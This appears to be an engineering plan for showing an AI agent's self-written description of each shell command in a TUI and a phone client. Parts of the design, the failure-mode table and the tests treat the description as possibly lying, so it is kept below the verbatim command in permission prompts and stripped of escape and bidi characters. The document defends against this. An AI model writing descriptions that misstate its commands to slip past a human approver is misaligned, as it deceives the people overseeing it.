# feat/shell-intent-line — a sentence of what a shell command does

> **Status:** implementation — fix round 1 done (S3 PARTIAL: TUI ask wrapped + full colour built; the intent row waits on the owner's `askedFor` ruling, Design §5 ⚠)
> **Branch:** `feat/shell-intent-line`
> **Type:** feat · **Size:** L · **Blast:** load-bearing · **Suited:** Opus executes in four slices on this one branch (~30 files, 7 packages + the app); Review MANDATORY fresh-context, red-teaming the permission slice S3 (AGENTS §7 "a pod is not trusted": pod-supplied text now sits in the ask a human decides on)
> **Changelog:** `changelog.d/shell-intent-line.added.md`

## Context

*— claude-opus-5-5, 2026-11-21*

**Problem.** A running or finished `shell` call shows the raw command
(`● Bash bun run typecheck -p packages/tui`; on the phone `Bash` + the mono
command). The person reads *how*, not *why*. The owner agreed (TODO.md row,
2026-11-20) to show a short sentence of WHAT the command does, written by the
model in the same call, in the user's language, with today's row as the fallback.

**Owner decisions in the brief** (as first briefed; the slot and reasoning points are SUPERSEDED by «Owner decisions 2026-11-21» under Owner questions):
- Source: an optional `description` input on the `shell` tool — no extra model call.
- While running, the sentence replaces «Thinking…» (the slot label); done, the
  row title = sentence + outcome (✓ / ✗ exit N, the outcome WRITTEN, never by
  hue alone — the owner is colour-blind); tap → exact command, output, the
  reasoning before it.
- SECURITY: a permission ask ALWAYS shows the verbatim command; the sentence at
  most as a subtitle — the model (a pod) may describe something other than it runs.
- Mac TUI + iPhone parity. Alternative thinking spinners are a separate owner
  question (mockup Section B).

**Mockups:** `.tentacle/mockups/shell-intent-line/index.html` (gitignored):
Section A — the animated transition (Thinking… → sentence while running → done
row with written outcome → Thinking… → a second command that fails ✗ exit 2 →
Working…), three variants for TUI + iPhone, the tap-to-expand detail and the
permission ask with a deliberately lying sentence; Section B — today's spinner
plus five alternatives, with a reduce-motion toggle.

**Repro** (2026-11-21, this branch = `main` b875a12d; `.tentacle/tmp/shell-intent-line/repro.ts`):

```ts
import { eventToUpdate } from "../../../packages/daemon/src/mapping.ts";
import { updateToEvent } from "../../../packages/client/src/mapping.ts";
import { describeToolCall } from "../../../packages/agent/src/permission-gate.ts";
import { shellTool } from "../../../packages/tools/src/builtins.ts";
import { toolTitle } from "../../../packages/tui/src/render-lines.ts";
const args = JSON.stringify({ command: "bun test apps/mobile", description: "Controllo i test del pacchetto mobile" });
const update = eventToUpdate({ type: "tool_start", id: "c1", name: "shell", arguments: args });
console.log("wire tool_call.rawInput:", JSON.stringify(update && "rawInput" in update ? update.rawInput : null));
const back = updateToEvent(update as never, new Map());
console.log("client tool_start.arguments:", back && "arguments" in back ? back.arguments : null);
console.log("tool schema parse (today):", JSON.stringify(shellTool.inputSchema.parse(JSON.parse(args))));
console.log("TUI title (today):", JSON.stringify(toolTitle({ kind: "tool", id: "c1", name: "shell", args, status: "running" } as never)));
console.log("permission detail (today):", JSON.stringify(describeToolCall(shellTool as never, JSON.parse(args)).detail));
```

```
wire tool_call.rawInput: {"command":"bun test apps/mobile","description":"Controllo i test del pacchetto mobile"}
client tool_start.arguments: {"command":"bun test apps/mobile","description":"Controllo i test del pacchetto mobile"}
tool schema parse (today): {"command":"bun test apps/mobile"}
TUI title (today): {"label":"Bash","subtitle":"bun test apps/mobile"}
permission detail (today): "bun test apps/mobile"
```

Read: a `description` the model sends ALREADY travels daemon → wire → client
untouched; today the schema neither advertises it to the model nor keeps it
(zod strips it), and no client renders it. The capability missing is (a) the
model being asked for it and (b) the two clients drawing it.

## Implementation

*— claude-opus-5-5, 2026-11-21 (rewritten after the Owner decisions 2026-11-21: variant B, slot unchanged, no reasoning in the detail, shell only, beta `compactShell`)*

**Scope in one line.** A `shell` call whose model gave a `description` draws as
TWO rows — the sentence + a WRITTEN outcome, then `$ <command>` subtle and cut —
on the Mac TUI and the iPhone; the permission ask shows the verbatim command
first (full colour, wrapped) and the sentence under it, attributed; a beta
`compactShell` (default OFF) hides the `$` row while running and on success.
OUT of this task: the spinner slot (unchanged), the reasoning (stays where it
is), MCP / `workload_shell` / sub-agent tree rows, the ∴ spinner and the
blinking phone dot (Follow-ups).

### Load-bearing assumption

**The `shell` call's raw input — including a new optional `description` — reaches
BOTH clients at the moment the call starts, before its permission ask, with no
protocol change.** Proven (repro in Context shows all four hops on a real value):

- The agent yields `tool_start` with the model's RAW `call.arguments` string
  (not the zod-parsed input), `packages/agent/src/agent.ts:2170`, and only THEN
  authorizes the call (`authorizeCall`, `agent.ts:2182`). So the row with its
  arguments exists before any ask.
- The daemon maps it to `tool_call` with `rawInput: safeParseArgs(event.arguments)`
  (`packages/daemon/src/mapping.ts:293-300`); `ToolCallSchema.rawInput` is
  `z.unknown()` (`packages/protocol/src/updates.ts:49-56`), so nothing strips it.
- The client maps it back to `tool_start` with `arguments: JSON.stringify(rawInput)`
  (`packages/client/src/mapping.ts:279-290`); the TUI keeps it as `ToolItem.args`
  (`packages/tui/src/state.ts:137`), the phone as `ToolRow.args`
  (`apps/mobile/src/transcript-rows.ts:122`).
- `--resume` rebuilds `args: call.arguments` from the persisted `toolCalls`
  (`packages/tui/src/resume.ts:133`) — the sentence survives a resume for free.

⇒ **No protocol change, no `protocol.d/` note, no persisted-format change.**

### Preconditions (verified)

- **Tool schema strips unknown keys / advertises described ones.** `shellInput`
  is a plain `z.object` (`packages/tools/src/builtins.ts:406-421`); validation is
  `tool.inputSchema.safeParse` (`packages/tools/src/registry.ts:96`), the model
  sees `zodToJsonSchema(tool.inputSchema)` with `.describe()` text
  (`registry.ts:64`). Adding an optional key is additive; `execute`
  (`builtins.ts:428-459`) never reads it.
- **Exit code source.** `shell` returns `exit=${code}\n…` with
  `isError = code !== 0` (`builtins.ts:458`); a killed process is 124
  (`builtins.ts:404`); a background start has no `exit=` (`builtins.ts:438-441`).
  A SPILLED result's `content` starts with the banner, but `spill.head` is the
  original content's head (`packages/agent/src/result-pipeline.ts:98-105`), so
  `exit=` is still readable there. The TUI keeps `resultText` + `spill`
  (`state.ts:572-582`); the phone keeps `output` + `spill`
  (`transcript-rows.ts:125,137`). A denial is `Permission denied by the user: …`
  (`agent.ts:3142`, no `exit=`); the phone has its own `denied` status
  (`apps/mobile/src/tool-summary.ts:165-167`).
- **TUI row = `toolLines`** (`packages/tui/src/render-lines.ts:858-913`): queued
  one dim row (`:876-882`), header assembly `:885-895`
  (`● <bold label> <subtle fitted subtitle><elapsed>`), expanded command rows
  `commandRows` (`:710-722`, `  │ ` prefix), body with `⎿` connector (`:913`).
  `toolTitle` (`:617-631`) has two callers only (`:877`, `:885`).
- **TUI row count follows the lines.** `itemRows` caches the rows `toolLines`
  returns per item identity + width/threshold/preview (`render-lines.ts:1241-1268`)
  and `layoutTranscript` (`:1335`) sums them — a second row is counted with no
  change to `app-layout.ts`'s transcript maths. `chartGlyphs` is the precedent of
  an App-lifetime display option deliberately NOT in that key (`:84-89`).
- **⚠ Executor correction: a running tool HAS a body today.** `toolBody` returns
  `⎿ running…` for every running call (`render-lines.ts:564`, captured on `main`:
  `● Bash bun test apps/mobile` / `⎿ running…`), so the owner's «none today» was
  inaccurate. Implemented to the owner's stated end state and this plan's tests
  («running → exactly 2 rows», «no running line»): a DESCRIBED shell row drops
  that body while running; the no-sentence row keeps it (byte-identical).
- **Blink touches row 0 only.** `withPhase` → `offPhaseRows` swaps only the
  first `BULLET` of row 0 (`render-lines.ts:1197-1208, 1288-1297`): a `$` row
  under it is unaffected.
- **Click hit = header row only.** `toolCallAt` returns the id only for
  `absRow === item.start` (`packages/tui/src/tool-hit.ts:60-62`): the `$` row is
  text, like today's continuation rows.
- **TUI permission dialog.** Detail = ONE row for a tool
  (`packages/tui/src/permission-ui.ts:128-131`), painted DIM and TRUNCATED to
  `columns − 3` (`components/PermissionPrompt.tsx:65-70`); non-tool asks already
  get up to `MAX_DETAIL_ROWS = 10` with a `… N more lines` row
  (`permission-ui.ts:120, 132-137`). Height = `permissionPromptRows`
  (`PermissionPrompt.tsx:15-25`), fed by `permissionDetailLines(...).length` in
  `app-layout.ts:368-376` and painted in `AppView.tsx:136-148` — two consumers,
  so the row decision must be ONE pure function both call.
- **Permission request content.** `describeToolCall` builds `detail: command` and
  the prefix suggestion from `command` ONLY
  (`packages/agent/src/permission-gate.ts:39-48`). The client rebuilds the request
  with `input: {}` (`packages/client/src/permission-router.ts:102-112`); its
  `prompt` action carries `agent` but not `toolCallId` (`:356-382`), and
  `RemoteClient` forwards `turnId` + `agent` to the broker
  (`packages/client/src/remote-client.ts:4717-4721`). The wire already has
  `toolCallId` (`packages/protocol/src/permission.ts:65`); it has NO `origin` —
  a sub-agent's ask is the one carrying `agent` (`permission.ts:74-79`); the core
  `PermissionRequestOptions` already has `toolCallId` + `origin`
  (`packages/core/src/permission.ts:153-160`). The TUI stores `options.agent` at
  `permission-ui.ts:478`; the phone sheet at
  `apps/mobile/src/permission-sheet.ts:81, 286-291` and paints `request.detail`
  full, mono, unclipped (`screens/PermissionSheet.tsx:145-150`).
- **Phone step.** The view-model is the pure `stepRowView`
  (`apps/mobile/src/tool-steps.ts:282-343`: `name`, `subtitle` = one mono line
  AFTER the name, `trailing` from `toolMeta` `tool-summary.ts:158-169`, body
  `command` = `bodyCommand` `:414-420`). `StepNode` draws name + subtitle +
  trailing on ONE horizontal line (`ui/StepNode.tsx:627`, name `maxWidth: "45%"`
  `:629`), the `ThinkingWord` shimmer only for `node === "thinking"`
  (`:391-397`). Rendered by `ToolRowView`
  (`screens/transcript/TranscriptRow.tsx:575-668`), whose screen-owned half is
  `StepProps` (`:116-124`).
- **Config plumbing precedent (`tui.chartGlyphs`).** Schema `tui` (strict,
  `packages/config/src/schema.ts:471-482`), docs `key-docs.ts:975-1011` (tested by
  `packages/config/test/key-docs.test.ts`, `packages/cli/test/key-docs-carried.test.ts`),
  template comment `defaults.ts:261-264`; read at `packages/cli/src/main.ts:1429`
  and `:2286`, and for `connect` by `connectChartGlyphs` (`connect.ts:88-91,
  178-195`, used `:263`, `:394`); into the TUI via `run.tsx:112, 211` →
  `App.tsx:250` → `RenderOptions` (`render-lines.ts:89`, `App.tsx:879/1054`).
- **Phone Beta precedent.** Settings → Beta section with one `Switch` row per
  feature (`apps/mobile/src/screens/SettingsScreen.tsx:558-603`); the Figtree
  switch has its OWN versioned `SecureKV` record with fail-safe parse
  (`theme-settings-store.ts`, key `tentacle.theme`), holder wired in
  `theme-settings-expo.ts:11`, passed at `apps/mobile/App.tsx:2453`.
- **Sanitizer precedent.** Pod-supplied strings: control chars → space, capped
  (`progressText`, `packages/client/src/mapping.ts:126-130`); format/bidi classes
  stripped, not spaced (`gateExitText`, `:132-…`).

### Design

**1. Tool schema** (`builtins.ts:406-427`): add
`description: z.string().optional().describe(…)` — NO `.max()` (an over-long
sentence must never fail the call and cost a round). Wording: *"A short sentence
(≤ 8 words) saying WHAT this command does and why, in the language the user
writes in — e.g. 'Run the mobile package tests'. Shown to the user above the
command."* One more sentence in the tool `description`: "Always give
`description`." `execute` unchanged.

**2. `packages/core/src/shell-intent.ts` (new, pure, exported from
`core/src/index.ts`)** — the ONE decision both clients project:

- `shellIntent(args: string): string | null` — `JSON.parse`; `description` if
  a string; strip C0/C1 controls and ANSI (→ space), strip bidi/format and
  zero-width chars (the `gateExitText` classes), collapse whitespace, trim;
  `""` → `null`; cut to `INTENT_MAX = 72` code points (`Array.from`, never
  splitting a surrogate pair) + `…`. Non-JSON / non-object / non-string → `null`.
- `shellCommand(args: string): string` — the `command` string, `""` if absent.
- `shellExitCode(text: string | undefined): number | null` — `^exit=(-?\d+)(\n|$)`
  on the given text; else `null`.
- `shellOutcome(o: { status: "running" | "queued" | "ok" | "error" | "denied"; text?: string; spillHead?: string }): string | null`
  — `null` while running/queued; `ok` → `"✓"`; `error`/`denied` with a code
  from `shellExitCode(spillHead ?? text)` → `` `✗ exit ${N}` ``, without one →
  `"✗"` (the body already says denied / why — never an invented `exit N`).
  Glyph + word, never hue alone (owner is colour-blind).
- `shellRowParts(args, status, compact: boolean): { sentence: string; command: string; commandRow: boolean } | null`
  — `null` when `shellIntent` is `null` (⇒ today's row, byte-identical).
  `commandRow = !compact || status === "error" || status === "denied"` — the
  beta rule: hidden while running/queued and on exit 0, shown on exit ≠ 0 /
  error / denial. (The tap detail and the permission ask ignore `compact`.)
- `INTENT_MAX` exported for tests.

**3. TUI rows (variant B)** — `render-lines.ts` `toolLines`, a `shell` branch
before today's header (`:883`), using `shellRowParts(tool.args, tool.status,
opts.compactShell === true)`:

- `null` ⇒ today's code path untouched.
- Header (row 0): `● <bold sentence> <outcome><elapsed>` — outcome from
  `shellOutcome({status, text: tool.resultText, spillHead: tool.spill?.head})`,
  coloured `success` / `error` AND written (`✓`, `✗ exit 2`); the sentence is
  cut by `fitSubtitle` to `cols − bullet − outcome − elapsed`. Running: no
  outcome, no elapsed (as today), the bullet blinks via `withPhase` (unchanged).
  **No result / "running…" line is added** while it runs.
- Row 1 when `commandRow` and NOT expanded: `  ` + `theme.subtle("$ " +
  firstLine(command))`, cut with `…` to `cols` (a multi-line command → first line
  + `…`); always exactly one row.
- Expanded (click / Ctrl+O): header unchanged; `commandRows("$ " + command,
  cols)` (`  │ $ …`, full, wrapped) — ALWAYS, even under `compactShell` — then
  the body as today. No reasoning (owner).
- Queued (`◌`): `queuedRow({ label: sentence, subtitle: "" })` + the `$` row
  when `commandRow` (subtle, same rule).
- `RenderOptions` gains `compactShell?: boolean` (`render-lines.ts:89` next to
  `chartGlyphs`). Unlike `chartGlyphs` it IS added to the `itemRows` cache-entry
  check (`:1263-1268`, one boolean): a module-level cache keyed only by item
  identity would serve a compact row to a non-compact render of the same item
  (a test-order flake today, a correctness bug if it ever becomes toggleable).

**4. TUI config `beta.compactShell`** (laptop-only display setting, default
false): new top-level strict section `beta: z.object({ compactShell:
z.boolean().optional() }).strict().optional()` in `schema.ts` (beside `tui`,
`:471`); `key-docs.ts` entries `beta` (section, `carried: "no"`) and
`beta.compactShell` (leaf, boolean, default false, details: "with a sentence,
the `$ command` row shows only on failure; the command stays in the permission
ask and in the expanded row; a lying sentence is caught only by expanding"),
a template comment in `defaults.ts`. Plumbing exactly like `chartGlyphs`:
`main.ts:1429`, `:2286` (`compactShell: config.beta?.compactShell ?? false`),
`connect.ts` (`ConnectOptions.compactShell`, `connectCompactShell` reading the
file, silent `false` on a broken file), `run.tsx` option → `App` prop →
`RenderOptions` at both `App.tsx` call sites (`:879`, `:1054`, their deps
lists `:892`, `:1061`). Never carried to a pod (display only; a pod daemon
never renders).

**5. Permission ask (security rule)** — the command is the subject; the
sentence is an attributed footnote.

- Client (`permission-router.ts:356-382`): the `prompt` action adds
  `toolCallId: entry.update.toolCallId` and `origin: entry.update.agent ? "subagent" : "call"`
  (derived from the wire's existing `agent`, no new field);
  `remote-client.ts:4717-4721` forwards both in the requester options (core type
  already has the fields). Client-internal, no protocol change.
- Join (pure, core `shell-intent.ts`):
  `permissionIntent(req: PermissionRequest, call: { toolCallId?: string; origin?: "call" | "subagent" }, argsOf: (id: string) => string | undefined): string | null`
  — non-null ONLY when `req.tool === "shell"`, `origin === "call"` (or absent
  with a `toolCallId`: a local ask is the call's own), and `shellIntent` of the
  joined row's args is non-null. `origin: "subagent"` → `null` (the id names the
  parent `agent_task`, the join would show the wrong sentence).
- TUI: `permission-ui.ts` stores `{ toolCallId, origin }` beside `pendingAgent`
  (`:478`); a NEW pure `permissionView(req, intent, columns)` in
  `permission-ui.ts` returns `{ detailRows: string[]; intentRow: string | null }`:
  for a `shell` ask the command is WRAPPED to `columns − 3` over up to
  `MAX_DETAIL_ROWS` rows (the existing cap, last row `… N more lines` — never a
  silent cut; a multi-line command keeps its lines), and `intentRow =
  `the model says: “${intent}”`` cut to one row. Other asks: today's
  `permissionDetailLines`, `intentRow: null`. BOTH `app-layout.ts:368-376`
  (row count: `detailRows.length + (intentRow ? 1 : 0)`) and `AppView.tsx`
  → `PermissionPrompt` (paint) consume that one view — the S3 single-decision
  rule. `PermissionPrompt` paints detail rows in the DEFAULT foreground (Q3:
  no longer dim), the intent row dim, right under the command, above `in <cwd>`.
  The `App` passes `argsOf` = lookup in `st.items` by id.
- Phone: `permission-sheet.ts` stores `call: { toolCallId, origin }` from the
  options (`:286-291` pattern); `SessionScreen` computes `permissionIntent`
  against its rows and passes `intent` to `PermissionSheetView`, which draws
  `the model says: “…”` (`typography.footnote`, `sec`, `numberOfLines={1}`)
  directly UNDER the mono command box (`PermissionSheet.tsx:145-150`, already
  full and unclipped), before `Asked by …`.
- The "don't ask again" prefix keeps coming from the command only
  (`permission-gate.ts:42`) — pinned by a test, not changed.
- **⚠ Executor correction (claude-opus-5-5, 2026-11-21) — S3 STOPPED, needs
  re-approval.** The Client bullet above contradicts a pinned invariant:
  `PermissionRequestOptions.toolCallId` / `origin` are *process-internal, never
  from the wire* (`docs/feat/permission-call-attribution.md:142-145`, its Review
  `:636-639`), asserted by `packages/client/test/foreign-turns.test.ts:775-777`
  ("Laptop-internal attribution never comes from the wire"). Daemon-side those
  two fields drive `classifyPending` (resume semantics, `daemon/src/hosted-session.ts:1266-1282`),
  so filling them from a pod's frame on the laptop breaks the guard the
  attribution Review relied on. **Proposed amendment** (not implemented): leave
  `toolCallId`/`origin` untouched; add a separate, display-only, wire-derived
  options field beside `agent` — e.g. `PermissionRequestOptions.askedFor?: {
  readonly callId: string; readonly subagent: boolean }` (documented "forgeable
  by a pod, display only, never read by a decision", like `agent`), set by the
  router's `prompt` action from `update.toolCallId` / `update.agent !== undefined`
  and forwarded by `remote-client.ts`; `permissionIntent` reads it instead. The
  foreign-turns assertion stays as it is (and gains `askedFor` = the wire's id).
  Everything else in §5 (the TUI `permissionView`, full-colour wrapped command,
  the phone sheet) is unchanged by the amendment.
- Under `compactShell` the ask is unchanged (the command is always there).

**6. Phone rows (variant B)** — pure first, components dumb:

- `tool-steps.ts` `stepRowView(row, thought, full, thoughtFirst, compact = false)`:
  when `shellRowParts(row.args, row.status, compact)` is non-null →
  `name = { tool: sentence }`, `subtitle = ""`, NEW `subline: "$ " +
  firstLine(command)` or `null` (when `!commandRow`), `shimmer: dot ===
  "running"`, and `trailing` = `toolMeta`'s with the outcome prefixed:
  `✓ 1.2 s` / `✗ exit 2 · 3.4 s` / `✗ · 3.4 s` (error, no code); a denial keeps
  today's `denied`; `live` unchanged (the ticking `4 s`). `command` (body) unchanged —
  the open body is Command → Output as today; the thought stays where it is
  today (owner). `a11yLabel` reads the sentence then the outcome words
  ("exit code 2"). No sentence ⇒ today's view, byte-identical.
- `StepRowView` gains `subline: string | null` and `shimmer: boolean`.
- `StepNode`: when `subline !== null`, a second line under the name line
  (mono `typography.stepMono` 12.5 pt, `sec`, `numberOfLines={1}`,
  `ellipsizeMode="tail"`) inside the same `Pressable`; when the name is a
  sentence it may take the full width (lift the `45%` cap only when `subtitle
  === ""`); `shimmer` draws the name with the existing `ThinkingWord`
  (static under Reduce Motion, as it already is). No new animation.
- `toolMeta`'s "Never an exit code" comment → "shell's outcome adds one
  (`shellOutcome`)".
- `compact` flows `App.tsx` → `SessionScreen` → `StepProps.compactShell`
  (`TranscriptRow.tsx:116-124`) → `stepRowView`.

**7. Phone Beta switch `Compact shell rows`** (default OFF): its OWN record
`tentacle.shell-rows` `{v:1, compactShell}` in a new
`apps/mobile/src/shell-rows-store.ts` copying `theme-settings-store.ts`'s
fail-safe rules (missing/unreadable/unknown `v` → OFF; unknown `v` never
written over; a write failure keeps the pick for this run) + a
`shell-rows-expo.ts` Keychain adapter; a new `Row` + `Switch`
(`testID="beta-compact-shell"`) in the Beta section of `SettingsScreen.tsx`,
wired in `App.tsx` beside `onThemeBeta` (`:2453`). Not carried to the daemon.

### Files

In dependency order:

1. `packages/tools/src/builtins.ts` — `description` field + wording.
2. `packages/core/src/shell-intent.ts` (new), `packages/core/src/index.ts`.
3. `packages/config/src/schema.ts`, `key-docs.ts`, `defaults.ts` — `beta.compactShell`.
4. `packages/client/src/permission-router.ts`, `remote-client.ts` — `toolCallId`/`origin` to the requester.
5. `packages/cli/src/main.ts`, `connect.ts` — read and pass `compactShell`.
6. `packages/tui/src/render-lines.ts` — B rows, `compactShell` option + cache key.
7. `packages/tui/src/run.tsx`, `app-types.ts`, `App.tsx` — prop plumbing; `argsOf` for the ask.
8. `packages/tui/src/permission-ui.ts`, `components/PermissionPrompt.tsx`, `app-layout.ts`, `AppView.tsx` — `permissionView`, full-colour wrapped command, intent row.
9. `apps/mobile/src/tool-steps.ts`, `tool-summary.ts`, `ui/StepNode.tsx`, `screens/transcript/TranscriptRow.tsx` — B step.
10. `apps/mobile/src/permission-sheet.ts`, `screens/PermissionSheet.tsx`, `screens/SessionScreen.tsx` — intent under the command.
11. `apps/mobile/src/shell-rows-store.ts` (new), `shell-rows-expo.ts` (new), `screens/SettingsScreen.tsx`, `App.tsx` — Beta switch.
12. `changelog.d/shell-intent-line.added.md`.

NOT touched (owner): `spinner-slot.ts`, `app-layout.ts`'s slot/transcript maths,
`state.ts` (no reasoning capture), `subagent-view.ts`, MCP rows, `protocol/*`.

**Slices** (one branch, each green on its narrow tests before the next):
**S1** = 1–3 (core + schema + config). **S2** = 5–7 (TUI rows + beta key).
**S3** = 4, 8, 10 (the permission ask, both clients — the security slice).
**S4** = 9, 11, 12 (phone rows + Beta switch).

### Failure modes

| Case | Behaviour / convergence |
|---|---|
| `description` missing, `null`, non-string, `""`, whitespace | `shellIntent` → `null` ⇒ today's one-row `Bash <command>` exactly (TUI and phone), no `$` row, no outcome word; ask unchanged except the command's colour/wrap. |
| Too long (a paragraph) | Never rejected by the schema; 72 code points + `…` in core; TUI further fits row 0 to its width; phone `numberOfLines={1}`. Row count stays 2 (or 1 compact). |
| Newlines / ANSI / control / bidi / zero-width chars (a pod or a confused model) | Stripped in `shellIntent` before any client draws it — it can never move the cursor, add a row or reorder the visible text. |
| Wrong language | Shown as written (Q8). |
| Sentence lies about the command | Rows (beta off): the `$ command` row sits under it, visible at a glance. Ask: the command is first, full colour, wrapped (≤ 10 rows + `… N more lines`), the sentence dim and attributed; the "don't ask again" prefix never reads it (test). Beta on: caught only by expanding — the accepted, documented cost; why it is beta. |
| Very long / multi-line command in the ask (TUI) | Wrapped, multi-line kept; beyond `MAX_DETAIL_ROWS` the last row says `… N more lines` (never a silent cut). Row count from the same view ⇒ the viewport maths cannot drift from the paint. |
| Ask join misses (row not yet in `st.items`, a replayed ask, a resync) | `argsOf` → `undefined` ⇒ `intentRow: null`: the ask shows the command only (safe direction). |
| Sub-agent ask (`origin: "subagent"`) | No sentence: the id names the parent call. A child's own `shell` rows in the sub-agent tree keep the command (debt, out of scope). |
| Parallel `shell` calls | Each row has its own sentence and `$` row; nothing shared. |
| Pods (`run`/`attach`) | The description is pod-supplied like the command already is: display only, sanitized, never feeds a decision or an approval. Nothing new crosses to the laptop; `beta.compactShell` is `carried: "no"`. |
| Old sessions / old daemon | No `description` ⇒ fallback row. No version skew: the field is free in `rawInput`. |
| Older tentacle binary reading a config with `beta` | The file schema is strict ⇒ that binary rejects the config (true of every new key; pre-public). Documented in the key's `details`. |
| `--resume` | Sentence survives (in args), outcome recomputed from the persisted result text. |
| Model never fills it | Fallback; measured once (Tests). Below 80 % fill on a provider: one system-prompt line (Q9) — no code path depends on it. |
| `run_in_background` | Sentence titles the row; result has no `exit=` ⇒ `✓` only. |
| Killed (exit 124) | `✗ exit 124` + today's `[killed …]` note in the body. |
| Spilled result | Code read from `spill.head` (the original head); body = today's spill note. |
| Denied | TUI: no `exit=` ⇒ `✗` + today's `✗ Denied …` body. Phone: today's `denied` trailing. `commandRow` shown under beta (error-like). |
| Beta toggled on the phone mid-session | `compact` is a render input: rows re-project on the next render, nothing stored per row. TUI: launch-time only (like `chartGlyphs`), in the cache key. |
| Phone Beta record unreadable / newer `v` | Reads OFF, never written over (theme-store rules); the switch still works for this run. |
| Narrow terminal (≤ 20 cols) / large Dynamic Type | TUI: each of the two rows is cut to `cols`, never wraps; phone: both lines `numberOfLines={1}`. |

### Tests

Red first on each (shown failing before the change), with the mutation that
must turn it red again (AGENTS §9).

- `packages/core/test/shell-intent.test.ts` (new): `shellIntent` missing / empty /
  whitespace / non-JSON / number → `null`; `\x1b[2J`, `\n`, `‮`, `​`
  removed; 200-char input → 72 code points + `…`, an emoji at the cut not split;
  `shellExitCode` `exit=0`/`exit=2`/`exit=124`/`exit=-1`/none/`exit=2x`;
  `shellOutcome` ok → `✓`, error+`exit=2` → `✗ exit 2`, error+spill head
  `exit=3` (content = banner) → `✗ exit 3`, denied text → `✗`, background ok →
  `✓`, running → `null`; `shellRowParts` compact running/ok → `commandRow:false`,
  compact error/denied → `true`, non-compact → always `true`;
  `permissionIntent` `origin:"subagent"` → `null`, non-shell → `null`, unknown id
  → `null`. *Mutations:* drop the control strip → ANSI case red; read `text`
  before `spillHead` → spill case red; drop the `status==="error"` clause →
  compact-error case red.
- `packages/tools/test/…builtins`: JSON schema to the model contains
  `description` + wording; a 5 000-char description still executes (no `.max`);
  `execute` output identical with/without it. *Mutation:* `.max(80)` → red.
- `packages/config/test/…`: `beta.compactShell: true` parses; `beta.x` rejected
  (strict); key-docs completeness tests cover the two new keys
  (`key-docs.test.ts`, `key-docs-carried.test.ts` = `carried: "no"`).
- `packages/tui/test/render-lines.test.ts`: shell + sentence, running → exactly
  2 rows: row 0 has the sentence and NO outcome, row 1 = `  $ <cmd>`; settled
  ok → row 0 contains `✓`; error `exit=2` → contains `✗ exit 2` **with SGR
  stripped** (written, not hue); multi-line command → row 1 is its first line +
  `…`; width 30/80/200 → every row's cell width ≤ cols; expanded → `  │ $ <cmd>`
  wrapped, full; `compactShell` running/ok → 1 row, error → 2 rows, expanded →
  command present; same item rendered compact then non-compact → different rows
  (cache key); no sentence → byte-identical to `main`'s output (snapshot of the
  old call); running row has no body / no "running" line. *Mutations:* outcome
  as colour only → SGR-stripped test red; drop `compactShell` from the cache key
  → the cache test red.
- `packages/tui/test/app.test.tsx` (ink-testing-library): a shell call with a
  sentence: the transcript frame shows sentence + `$ cmd` while running, the
  slot row still says `Working…` (unchanged — proves no slot change), then `✓`;
  the input row's y-position is stable from the call's start to its end (the
  exact property, §2: the 2-row block appears once, at `tool_start`, and does
  not grow at the result).
- `packages/tui/test/permission-detail.test.ts`: lying sentence → the command
  rows precede the `the model says:` row; a 300-char command at 80 cols → wrapped
  over ⌈300/77⌉ rows, all characters present; 15-line command → 10 rows, last
  `… 6 more lines`; `permissionPromptRows` from `permissionView` = rows actually
  painted (with / without intent; ink frame height asserted); `origin:"subagent"`
  → no intent row; the suggestion prefix for `{command:"ls", description:"git
  push --force"}` is `ls`'s. Detail rows not dim (assert on the element props,
  the harness strips SGR). *Mutation:* derive the prefix from `description` →
  red; count rows from `permissionDetailLines` instead of the view → height test red.
- `packages/client/test/permission-router…`: the prompt action carries
  `toolCallId`/`origin`; `remote-client` passes them to the requester (spy).
- `apps/mobile/test/tool-steps.test.ts` / `tool-summary.test.ts`: sentence →
  `name.tool = sentence`, `subtitle = ""`, `subline = "$ cmd"`; trailing
  `✓ 1.2 s` / `✗ exit 2 · 3.4 s`; compact running/ok → `subline: null`, error →
  shown; denied → `denied` kept; `shimmer` only while running; fallback
  byte-identical to `main`'s view.
- `apps/mobile/test/permission-sheet.test.ts`: `call` stored from options;
  intent only for `origin:"call"`.
- `apps/mobile/test/shell-rows-store.test.ts` (new, the theme-store test's
  cases): missing → OFF; `{v:9}` → OFF + write refused; write failure keeps the
  pick in memory.
- **Measurement (not a gate; run once by the executor, pasted into Execution):**
  `.tentacle/tmp/shell-intent-line/measure.ts` sends 20 fixed prompts that need
  a shell command (10 Italian, 10 English) to DeepSeek and to an Anthropic model
  with the new schema; reports fill rate, median length, language match.
  Acceptance (Q9): ≥ 80 % fill on both.

### Follow-ups (separate tasks — owner to add to `TODO.md`; not this branch)

1. **`feat/thinking-ergo-and-blink`** — the «∴ che ruota» thinking spinner
   (TUI ∴↔∵ every 640 ms = 8 × 80 ms shimmer ticks; `cells.ts` measures U+2234/
   U+2235 as 1 cell, mockup section B) and, on the iPhone, a running tool =
   the TUI's blinking ● (500/500 ms, shared phase) replacing the rotating ring
   (mockup section C).
2. **`feat/tui-mcp-row-names`** — TUI MCP rows readable like the phone
   (`playwright · browser_navigate  url` instead of the raw name + JSON), the
   naming rule moved to `@tentacle/core` so both clients share it (mockup
   section D). No intent sentence on MCP (Q6: shell only; a registry-level
   `_intent` is the shape if it ever comes back).
3. (debt, from Q6) `workload_shell` and the sub-agent tree rows keep the command.

### Owner questions — Approved 2026-11-21

*Decision record. The Owner decisions below override the numbered recommendations where they differ (Q1 → B, Q4 moot, Q11 → separate task); the Implementation above is written to them.*

**Owner decisions 2026-11-21** (mockup v3: `.tentacle/mockups/shell-intent-line/index.html`, https://claude.ai/artifact/RbAs3vkmizt8K1TdTAVd4A):
- **Q1 → B «frase sopra il comando»** (not A). Row = sentence; second row `$ {command}` in subtle, 1 line, truncated. Design §3–4 must be re-written for B (+1 transcript row only when a sentence exists).
- **TUI spinner slot unchanged**: it keeps Thinking…/Working… as today; the sentence NEVER goes in the slot. Drop `intent` in `SlotFacts`, `liveIntent`, `fitIntentLabel`; no change to `spinner-slot.ts` / `app-layout.ts` for the sentence.
- **Tap detail: no reasoning** — command verbatim + output only. Q4 is moot (reasoning stays where it is today, the Thought row).
- **Q6 → shell only.** No intent on MCP tools for now (owner: "restiamo su shell per ora"); a unified `_intent` at the tool-registry level is the shape if it ever comes back.
- **Q11 → «2 · ∴ che ruota»**, `cells.ts` width verified (∴/∵ = 1 cell, mockup section B); TUI swap every 640 ms (8 × 80 ms shimmer tick). Separate task, not this branch — together with: **iPhone running tool = the TUI blinking ● (500/500 ms, shared phase), replacing the rotating ring** (mockup section C).
